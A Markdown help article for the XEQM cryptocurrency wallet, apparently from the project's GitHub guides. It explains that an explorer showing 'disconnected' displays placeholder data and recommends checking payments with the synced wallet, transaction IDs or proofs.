![XEQM WALLET](assets/banner-article.png)

# XEQM explorer shows disconnected

<p align="center"><a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-win.exe"><img src="assets/button-windows.png" alt="Download for Windows" /></a> <a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-mac.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2F90F3?style=for-the-badge&labelColor=11141B&logo=apple&logoColor=white" alt="Download for macOS" /></a> <a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-linux.AppImage"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2F90F3?style=for-the-badge&labelColor=11141B&logo=linux&logoColor=white" alt="Download for Linux" /></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows" /> | Windows 10 or 11, 64-bit | [`XEQM-GUI-2.3.6-win.exe`](https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-win.exe) |
| <img src="https://img.shields.io/badge/macOS-1371E6?style=flat-square&logo=apple&logoColor=white" alt="macOS" /> | macOS, Apple Silicon | [`XEQM-GUI-2.3.6-mac.dmg`](https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-mac.dmg) |
| <img src="https://img.shields.io/badge/Linux-1371E6?style=flat-square&logo=linux&logoColor=white" alt="Linux" /> | x64 Linux, AppImage | [`XEQM-GUI-2.3.6-linux.AppImage`](https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-linux.AppImage) |

</div>


All versions and checksums are on the [XEQM WALLET release page](https://github.com/XEQMFoundation/XEQM-Wallet/releases/tag/v2.3.6).

Requirements follow the platforms the release ships assets for. No minimum OS build or disk figure is published for this tag.

> Only download from this GitHub release page.

An XEQM explorer showing "disconnected" means the page is not attached to a running daemon, and the data it displays in that state is placeholder rather than chain data. The observation was recorded on the project's explorer, and the cause is at the explorer's end rather than in your wallet. Do not treat a placeholder number as evidence about a payment.

## What the message means precisely

An explorer is a website in front of a node. It asks that node for blocks, transactions and addresses, and it formats the answers. When the node is unreachable, the page can either show an error or keep rendering with stand-in data.

The message you saw says which of those it chose. It is telling you the answers below it are not real.

## Why placeholder data is dangerous

A placeholder page looks like a working page: the layout is right, the boxes are filled, the numbers are plausible. A reader who does not notice the banner concludes something about a transaction from numbers that describe nothing.

That is how an explorer turns into a source of false certainty. The message is the most important part of the page, and it is usually the smallest text on it.

## What the wallet shows instead

The wallet reads the chain through its own node or a configured remote node, so it does not depend on the explorer's health. If the wallet is synced and shows a payment, the payment exists.

That is the reference to trust when the two disagree. An explorer is a convenience; the wallet's own read of the chain is the thing you are actually using. [XEQM transaction still pending](https://github.com/XEQMFoundation/account-guide/blob/main/xeqm-transaction-still-pending.md) covers a payment that looks stuck.

## How to tell a real explorer response from a placeholder

Look for a block height that advances between reloads, and for recent blocks that change. A page whose numbers never move is not connected, whatever its header says.

Then compare one known transaction with what your wallet reports. If they agree, the explorer is live; if the page shows nothing for a transaction the wallet has, treat the page as down.

## What to use when it is down

A synced local node, a remote node the wallet trusts, or a transaction proof generated from your own history. Those three answer the questions an explorer would answer.

A proof is the strongest of them for a specific payment, because it does not depend on anybody's website. [Verify an XEQM transaction proof](https://github.com/XEQMFoundation/account-guide/blob/main/verify-xeqm-transaction-proof.md) covers generating one.

## What a transaction ID is for

A transaction identifier names one transaction on one chain. It is what an explorer looks up, what a wallet shows in its history, and what a support conversation needs instead of a description.

Because it is public and precise, it survives the explorer being down: hand it to somebody with a working node and they can answer the question without any of your other information.

## What an address page can and cannot show

An address page lists the outputs the explorer can see. With stealth addressing, that is not a simple list of who paid you  -  the destinations on chain are one-time, and the page's view is shaped by what the wallet reveals.

So an address page is a rough convenience rather than a statement of your balance. Your wallet's own scan is the accurate view.

## Why the page might work later

An explorer attached to a node that restarts will show disconnected until the node is back and synced. Nothing on your side changes that, and nothing on your side needs to.

Check again later rather than treating the page as a service you have broken. [Switch to a remote node](https://github.com/XEQMFoundation/platform-setup/blob/main/switch-xeqm-wallet-to-remote-node.md) covers keeping your own access independent of it.

## Why explorers go down

They are infrastructure somebody runs. A daemon can stop, a host can lose its connection, and a public service can be rate-limited or over-subscribed during a busy period.

None of that says anything about the network. It says something about one website's attachment to one node, which is a fragile arrangement by nature.

## What it does not mean about your funds

It does not mean the chain stopped, that a payment failed, or that your balance changed. The explorer's view and the chain's state are different things, and only one of them is authoritative.

If your wallet is synced and shows the balance, the balance is there. That sentence is the whole answer to the panic this message causes.

## Checking with the wallet instead

Confirm the wallet reports Mainnet, that its sync indicator advances, and that the transaction you care about appears in its history. Those three checks replace everything the explorer was going to tell you.

If the wallet is behind, fix that first: an explorer cannot compensate for a wallet that has not read the chain. [XEQM WALLET not syncing](https://github.com/XEQMFoundation/platform-setup/blob/main/xeqm-wallet-not-syncing-fix.md) covers the case.

## When a service insists on an explorer link

Give the transaction identifier instead. It is public, it is precise, and it lets the other side look the payment up wherever they trust  -  including their own node.

A screenshot of a placeholder page is the worst of both worlds: it looks like evidence and contains none. [How to send XEQM](https://github.com/XEQMFoundation/account-guide/blob/main/how-to-send-xeqm.md) covers what to keep after a payment.

## Why a cached page looks alive

A browser can serve a page from its cache, and a site can serve a stale view from its own. Either way the layout appears and the numbers are old, and the only signal is a timestamp or a banner that most readers scroll past.

Reloading is the first test. If the page cannot be reached at all after a reload, the question is settled without any interpretation.

## Reporting it

If the explorer stays disconnected for a long time, say so with the time and what the page displayed. That is useful to whoever runs it and it is a one-line message.

Do not post a transaction identifier you would rather keep private just to demonstrate the problem. The message does not need one.

## What to do if you run one

If you operate an explorer, the message is doing its job: it is better to say disconnected than to render numbers that mean nothing. The improvement to make is making the state impossible to miss.

For a user, the lesson is the same in reverse: read the banner before the numbers.

## What to bookmark instead

Bookmark the release page rather than an explorer. The first is where the wallet comes from; the second is a convenience that comes and goes.

## The summary

Disconnected means placeholder data, and placeholder data means nothing. Trust the wallet's own read of the chain, use a proof for a specific payment, and treat the explorer as a convenience that is sometimes unavailable.

That is the correct weight to give a website in a system whose authority is the chain. [What is XEQM WALLET](https://github.com/XEQMFoundation/account-guide/blob/main/what-is-xeqm-wallet.md) covers what the wallet reports.

## Frequently asked questions

### Is the network down when the explorer is?

No. An explorer is one website attached to one node. The chain is separate from it.

### Does placeholder data mean my transaction failed?

No. It means the page is not reading a node, so it cannot tell you anything about your transaction.

### How do I check a payment without an explorer?

Use your synced wallet, or generate a proof from the transaction in its history.

### Should I trust an explorer over my wallet?

No. The wallet reads the chain directly; the explorer reads it through a node that may not be connected.

---

<p align="center"><a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-win.exe"><img src="assets/button-windows.png" alt="Download for Windows" /></a> <a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-mac.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2F90F3?style=for-the-badge&labelColor=11141B&logo=apple&logoColor=white" alt="Download for macOS" /></a> <a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-linux.AppImage"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2F90F3?style=for-the-badge&labelColor=11141B&logo=linux&logoColor=white" alt="Download for Linux" /></a></p>

## Related guides

- [How to receive XEQM](https://github.com/XEQMFoundation/account-guide/blob/main/how-to-receive-xeqm.md)
- [How to send XEQM](https://github.com/XEQMFoundation/account-guide/blob/main/how-to-send-xeqm.md)
- [XEQM transaction still pending](https://github.com/XEQMFoundation/account-guide/blob/main/xeqm-transaction-still-pending.md)
